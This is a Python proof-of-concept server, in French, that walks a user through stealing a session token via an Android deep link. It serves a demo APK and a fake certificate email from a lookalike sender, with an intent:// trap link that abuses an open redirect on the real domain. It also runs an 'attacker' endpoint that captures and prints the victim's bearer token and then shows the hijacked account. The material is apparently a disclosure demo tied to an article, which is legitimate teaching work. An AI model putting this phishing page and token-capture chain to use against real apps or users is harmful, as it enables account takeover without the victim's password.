#!/usr/bin/env python3
"""
PoC Formae — parcours guidé du vol de jeton de session via deep link.

Un seul serveur, lancé en une commande, qui guide l'utilisateur de bout en bout
DEPUIS SON TÉLÉPHONE (Android, dans Chrome) :

  1. /                onboarding : explication + téléchargement de l'app de démo
  2. /formae-poc.apk  l'APK servi directement (installation sans transfert manuel)
  3. /email           fausse boîte mail avec le lien piégé
  4. (clic)           l'app s'ouvre, déroule la chaîne et exfiltre le jeton ici
  5. /api/documents/certificate/<id>  le jeton arrive : log terminal + la page
                      mail bascule toute seule en « jeton exfiltré »
  /reset              réarme une nouvelle démo (bouton « Relancer »)
  /install-first      page de repli si l'app n'est pas installée au moment du clic

Données 100 % factices (application de démonstration, jeton factice, aucune cible réelle).
Lancement :  uv run receiver-server.py      (ou : python3 receiver-server.py)
"""
import os
import json
import socket
import threading
from urllib.parse import urlparse, quote
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = 8000
HERE = os.path.dirname(os.path.abspath(__file__))
APK_PATH = os.path.join(HERE, "formae-poc.apk")
APP_PACKAGE = "com.hdwsec.formaepoc"
CERT_ID = "8f3c"

# État des jetons capturés, indexé par IP cliente : le téléphone (app + navigateur)
# sort par la même IP LAN, donc on relie l'exfiltration de l'app au polling de SA
# page. Deux téléphones distincts (IP différentes) restent isolés. On ne remet
# jamais cet état à zéro depuis le chargement de page (sinon un rechargement de
# l'onglet effacerait une capture déjà arrivée) : le reset est explicite via /reset.
_lock = threading.Lock()
_captured = {}  # ip -> "Bearer ..."


def lan_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


IP = lan_ip()
BASE = f"http://{IP}:{PORT}"

# Le lien piégé. On utilise une URL intent:// plutôt qu'un simple formae-demo://
# car c'est la façon fiable de lancer une app depuis Chrome Android. Le paramètre
# url= (la cible de la redirection ouverte) est encodé une fois ; l'app le
# décodera via getQueryParameter("url"). S.browser_fallback_url envoie vers une
# page d'aide si l'app n'est pas installée, plutôt que vers une fiche Play Store
# inexistante.
_INNER = f"{BASE}/downloads/certificate/{CERT_ID}"
_FALLBACK = f"{BASE}/install-first"
TRAP_LINK = (
    "intent://app.formae.com/api/track/click?url=" + quote(_INNER, safe="")
    + f"#Intent;scheme=formae-demo;package={APP_PACKAGE};"
    + "S.browser_fallback_url=" + quote(_FALLBACK, safe="") + ";end"
)
# Ce que l'on AFFICHE à l'utilisateur (aperçu réaliste du lien de confiance).
PREVIEW_LINK = f"https://app.formae.com/api/track/click?url=https://attaquant.test/downloads/certificate/{CERT_ID}"

CSS = (
    ":root{--indigo:#4338CA;--bg:#F4F5F7;--card:#fff;--ink:#1a1a2e;--muted:#6b7280}"
    "*{box-sizing:border-box}"
    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
    "background:var(--bg);color:var(--ink);margin:0;padding:20px;line-height:1.55}"
    ".wrap{max-width:460px;margin:18px auto}.wrap.wide{max-width:760px}"
    ".brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;margin-bottom:16px}"
    ".mark{width:30px;height:30px;border-radius:8px;background:var(--indigo);color:#fff;"
    "display:grid;place-items:center;font-weight:800;font-size:15px}"
    ".mark.sm{width:24px;height:24px;border-radius:6px;font-size:12px}"
    ".badge{font-size:11px;font-weight:700;color:var(--indigo);background:#ede9fe;padding:3px 9px;border-radius:999px}"
    ".card{background:var(--card);border-radius:16px;padding:22px;box-shadow:0 4px 24px rgba(20,20,50,.07);margin-bottom:14px}"
    "h1{font-size:21px;margin:0 0 10px}p{color:#454759;margin:0 0 12px}"
    ".muted{color:var(--muted);font-size:13px}"
    ".note{font-size:12.5px;color:#9a6a00;background:#fff8eb;border:1px solid #fde9bf;padding:10px 12px;border-radius:10px;margin-top:14px}"
    ".btn{display:block;text-align:center;background:var(--indigo);color:#fff;text-decoration:none;"
    "padding:14px;border-radius:11px;font-weight:700;font-size:15px;border:0;width:100%;cursor:pointer;margin-top:8px}"
    ".btn.sec{background:#eef2ff;color:var(--indigo)}"
    ".warn{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:12px 14px;border-radius:10px;font-size:14px;margin-bottom:14px}"
    ".step{display:flex;gap:12px;margin:14px 0}"
    ".step .n{flex:0 0 26px;height:26px;border-radius:50%;background:var(--indigo);color:#fff;display:grid;place-items:center;font-weight:700;font-size:13px}"
    "code{font-family:ui-monospace,Menlo,monospace;font-size:12.5px}"
    ".mail{padding:0;overflow:hidden}.mailhead{padding:18px 20px;border-bottom:1px solid #eef0f3}"
    ".subject{font-weight:700;font-size:17px;margin-bottom:12px}"
    ".sender{display:flex;gap:10px;align-items:flex-start}"
    ".av{width:36px;height:36px;border-radius:50%;background:var(--indigo);color:#fff;display:grid;place-items:center;font-weight:700;flex:0 0 36px}"
    ".chip{display:inline-block;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#b45309;"
    "background:#fff7ed;border:1px solid #fed7aa;border-radius:6px;padding:1px 6px;margin:2px 0}"
    ".mailbody{padding:20px}"
    ".mailbar{background:var(--indigo);color:#fff;font-weight:700;padding:12px 14px;border-radius:10px;"
    "display:flex;align-items:center;gap:8px;margin:-20px -20px 16px}"
    ".preview{background:#1f2430;color:#cbd5e1;border-radius:10px;padding:12px 14px;margin-top:10px}"
    ".preview span{display:block;font-size:10px;letter-spacing:.08em;color:#94a3b8;margin-bottom:4px}"
    ".preview code{color:#7dd3a8;word-break:break-all}"
    ".ok{background:#fff;border:2px solid #ef4444;border-radius:16px;padding:18px 20px;margin-bottom:14px}"
    ".ok b{color:#b91c1c;font-size:16px}"
    ".tok{font-family:ui-monospace,Menlo,monospace;font-size:12px;background:#fef2f2;color:#7f1d1d;"
    "border-radius:8px;padding:10px;margin-top:8px;word-break:break-all}"
    ".dashtop{margin-bottom:8px}"
    ".chip.live{color:#b45309;background:#fff7ed;border:1px solid #fed7aa;font-size:12px;font-weight:600;padding:4px 10px;border-radius:999px}"
    ".grid{display:grid;grid-template-columns:1fr;gap:12px;margin-top:14px}"
    "@media(min-width:620px){.grid{grid-template-columns:1fr 1fr 1fr}}"
    ".tile{border:1px solid #eef0f3;border-radius:12px;padding:14px}"
    ".tile .k{font-size:11px;font-weight:700;color:var(--indigo);letter-spacing:.05em}"
    ".tile b{display:block;margin:6px 0 10px}"
    ".bar{height:7px;background:#eef0f3;border-radius:999px;overflow:hidden}"
    ".bar i{display:block;height:100%;background:var(--indigo)}"
)

# Polling de la capture. Pas de désarmement au chargement (sinon un rechargement
# d'onglet effacerait une capture déjà arrivée). On re-vérifie tout de suite au
# retour au premier plan (visibilitychange / pageshow), car Chrome gèle les
# timers des onglets en arrière-plan pendant que l'app est ouverte.
EMAIL_JS = (
    "function show(t){var ok=document.getElementById('ok');"
    "document.getElementById('tok').textContent=t;"
    "if(ok.style.display!=='block'){ok.style.display='block';ok.scrollIntoView({behavior:'smooth'});}}"
    "function check(){fetch('/status').then(function(r){return r.json();})"
    ".then(function(s){if(s.captured){show(s.token);}}).catch(function(){});}"
    "var poll=setInterval(check,1500);"
    "document.addEventListener('visibilitychange',function(){if(!document.hidden){check();}});"
    "window.addEventListener('pageshow',check);check();"
)


def shell(title, body):
    return (
        "<!doctype html><html lang=fr><head><meta charset=utf-8>"
        "<meta name=viewport content='width=device-width, initial-scale=1'>"
        "<title>" + title + "</title><style>" + CSS + "</style></head><body>"
        + body + "</body></html>"
    )


def page_onboarding():
    warn = "" if os.path.exists(APK_PATH) else (
        "<div class=\"warn\">APK non généré. Lancez <code>./build-apk.sh</code> "
        "à la racine du PoC, puis rechargez cette page.</div>"
    )
    body = f'''<div class="wrap">
  <div class="brand"><span class="mark">F</span> Formae <span class="badge">PoC</span></div>
  {warn}
  <div class="card">
    <h1>Vol de session via un simple lien</h1>
    <p>Cette démo reproduit, sur une application de démonstration, la faille décrite dans notre article : un lien piégé suffit à exfiltrer le jeton de session d'un utilisateur.</p>
    <p class="muted">Tout est factice : application de démonstration, jeton factice, aucune donnée réelle. À réaliser depuis un téléphone <b>Android</b>, dans <b>Chrome</b> (le lien piégé ne se lance pas sur Samsung Internet ni Firefox).</p>
  </div>
  <div class="card">
    <div class="step"><span class="n">1</span><div>
      <b>Installez l'application de démo</b>
      <p class="muted">Téléchargez l'APK puis ouvrez-le pour l'installer. Autorisez « installer des applications inconnues » si Android le demande.</p>
      <a class="btn" href="/formae-poc.apk">Télécharger l'app (.apk)</a>
    </div></div>
    <div class="step"><span class="n">2</span><div>
      <b>Une fois l'app réellement installée</b>
      <p class="muted">Passez à la fausse boîte mail pour déclencher l'attaque. Important : installez bien l'app avant, sinon le lien ne trouvera rien à ouvrir.</p>
      <a class="btn sec" href="/email">J'ai installé l'app, continuer</a>
    </div></div>
  </div>
  <p class="muted" style="text-align:center">Serveur récepteur (l'attaquant) : {BASE}</p>
</div>'''
    return shell("Formae — PoC deep link", body)


def page_email():
    body = f'''<div class="wrap">
  <div class="brand"><span class="mark">F</span> Formae <span class="badge">PoC</span></div>

  <div id="ok" class="ok" style="display:none">
    <b>Jeton de session exfiltré</b>
    <div class="tok" id="tok"></div>
    <p class="muted" style="margin:8px 0 0">L'app a envoyé le jeton de Camille à notre serveur, en silence. Avec ça, l'attaquant rejoue la session et entre dans le compte, sans mot de passe.</p>
    <a class="btn" href="/compte">Voir ce que l'attaquant récupère</a>
    <a class="btn sec" href="/reset">Relancer la démo</a>
  </div>

  <div class="card mail">
    <div class="mailhead">
      <div class="subject">Votre certificat « Sécurité applicative » est disponible</div>
      <div class="sender"><span class="av">F</span><div>
        <b>Formae</b><br>
        <span class="chip">notifications@formae-pro.com</span>
        <div class="muted">À : Camille Mercier</div>
      </div></div>
    </div>
    <div class="mailbody">
      <div class="mailbar"><span class="mark sm">F</span> Formae</div>
      <p>Bonjour Camille,</p>
      <p>Félicitations, votre attestation pour la formation <b>« Sécurité applicative »</b> est prête. Vous pouvez la consulter dès maintenant.</p>
      <a class="btn" href="{TRAP_LINK}">Voir mon certificat</a>
      <div class="preview"><span>APERÇU DU LIEN</span><code>{PREVIEW_LINK}</code></div>
      <p class="note">Expéditeur sosie (formae-pro.com), mais le lien pointe vers le <b>vrai domaine</b> app.formae.com. C'est ce qui le rend crédible et l'aide à passer les filtres anti-hameçonnage.</p>
    </div>
  </div>
  <p class="muted" style="text-align:center">En attente du clic sur « Voir mon certificat »...</p>
</div>
<script>{EMAIL_JS}</script>'''
    return shell("Formae", body)


def page_install_first():
    body = '''<div class="wrap">
  <div class="brand"><span class="mark">F</span> Formae <span class="badge">PoC</span></div>
  <div class="card">
    <div class="warn">L'application de démo n'est pas installée sur ce téléphone.</div>
    <p>Le lien a tenté d'ouvrir l'app Formae de démonstration, mais elle n'est pas là. Revenez à l'étape 1, installez l'APK, puis rouvrez le mail.</p>
    <a class="btn" href="/formae-poc.apk">Télécharger l'app (.apk)</a>
    <a class="btn sec" href="/">Retour aux étapes</a>
  </div>
</div>'''
    return shell("Formae — installer l'app", body)


def page_compte():
    body = f'''<div class="wrap wide">
  <div class="brand"><span class="mark">F</span> Formae <span class="badge">compte de la victime</span></div>
  <div class="card">
    <div class="dashtop"><span class="chip live">Session active : Camille Mercier</span></div>
    <h1>Bonjour Camille</h1>
    <p class="muted">Formations en cours chez Groupe Helios.</p>
    <div class="grid">
      <div class="tile"><span class="k">CONFORMITÉ</span><b>RGPD pour les managers</b><div class="bar"><i style="width:78%"></i></div><span class="muted">78% complété</span></div>
      <div class="tile"><span class="k">SÉCURITÉ</span><b>Cybersécurité niveau 1</b><div class="bar"><i style="width:45%"></i></div><span class="muted">45% complété</span></div>
      <div class="tile"><span class="k">LEADERSHIP</span><b>Management d'équipe</b><div class="bar"><i style="width:92%"></i></div><span class="muted">92% complété</span></div>
    </div>
    <p class="note" style="margin-top:18px">Tout ceci a été obtenu avec un simple clic sur un lien, sans jamais connaître le mot de passe de Camille.</p>
    <a class="btn sec" href="/email">Revenir au mail</a>
  </div>
</div>'''
    return shell("Formae — compte", body)


class Handler(BaseHTTPRequestHandler):
    def _send(self, body, ctype="text/html; charset=utf-8", code=200, extra=None):
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = urlparse(self.path).path
        ip = self.client_address[0]
        if path == "/":
            print(f"\n[->] onboarding servi à {ip}")
            self._send(page_onboarding())
        elif path == "/formae-poc.apk":
            self._serve_apk()
        elif path == "/email":
            print(f"\n[->] fausse boîte mail servie à {ip}")
            self._send(page_email())
        elif path == "/install-first":
            print(f"\n[!] lien tapé mais app absente (fallback) pour {ip}")
            self._send(page_install_first())
        elif path == "/compte":
            self._send(page_compte())
        elif path == "/reset":
            with _lock:
                _captured.pop(ip, None)
            print(f"\n[->] démo réarmée pour {ip}")
            self._send(page_email())
        elif path == "/status":
            with _lock:
                tok = _captured.get(ip)
            self._send(json.dumps({"captured": tok is not None, "token": tok}), "application/json")
        elif path.startswith("/api/documents/certificate/"):
            self._capture()
        elif path.startswith("/downloads/certificate/"):
            # Lien brut (aperçu) : l'app, elle, reconstruit /api/documents/...
            self._send(shell("Formae", "<div class=wrap><div class=card><p>Certificat (ressource factice de démonstration).</p></div></div>"))
        else:
            self._send(shell("404", "<div class=wrap><div class=card><p>Page introuvable.</p></div></div>"), code=404)

    def _serve_apk(self):
        if not os.path.exists(APK_PATH):
            print(f"\n[!] APK demandé mais absent ({APK_PATH})")
            self._send(shell("APK manquant", "<div class=wrap><div class=card><div class=warn>APK non généré. Lancez <code>./build-apk.sh</code> puis rechargez.</div></div></div>"), code=404)
            return
        with open(APK_PATH, "rb") as f:
            data = f.read()
        print(f"\n[->] APK téléchargé par {self.client_address[0]} ({len(data)} octets)")
        self._send(
            data,
            ctype="application/vnd.android.package-archive",
            extra={"Content-Disposition": 'attachment; filename="formae-poc.apk"'},
        )

    def _capture(self):
        ip = self.client_address[0]
        auth = self.headers.get("Authorization")
        ua = self.headers.get("User-Agent", "")
        print(f"\n[<-] GET {self.path}   (depuis {ip}, UA: {ua})")
        if auth:
            with _lock:
                _captured[ip] = auth
            print("    " + "=" * 60)
            print("    JETON DE SESSION EXFILTRÉ :")
            print(f"    {auth}")
            print("    " + "=" * 60)
        self._send(json.dumps({"status": "ok"}), "application/json")

    def log_message(self, *args):
        pass  # logs maison plus lisibles


def main():
    apk = "présent" if os.path.exists(APK_PATH) else "ABSENT (lancez ./build-apk.sh)"
    print("=" * 64)
    print("  PoC Formae — parcours guidé (serveur de l'attaquant)")
    print("=" * 64)
    print(f"  APK : {apk}")
    print("  Sur le téléphone Android (même wifi), ouvrez dans CHROME :")
    print(f"    {BASE}/")
    print("  Puis laissez-vous guider : installer l'app, ouvrir le mail, cliquer.")
    print("")
    print("  Le lien piégé ne se lance que sur Chrome (pas Samsung Internet ni Firefox).")
    print("  Si la page ne charge pas sur le téléphone : autoriser Python dans le")
    print("  pare-feu macOS, et éviter un wifi invité (isolation client).")
    print("=" * 64)
    print("  En attente...  (Ctrl+C pour arrêter)\n")
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()


if __name__ == "__main__":
    main()
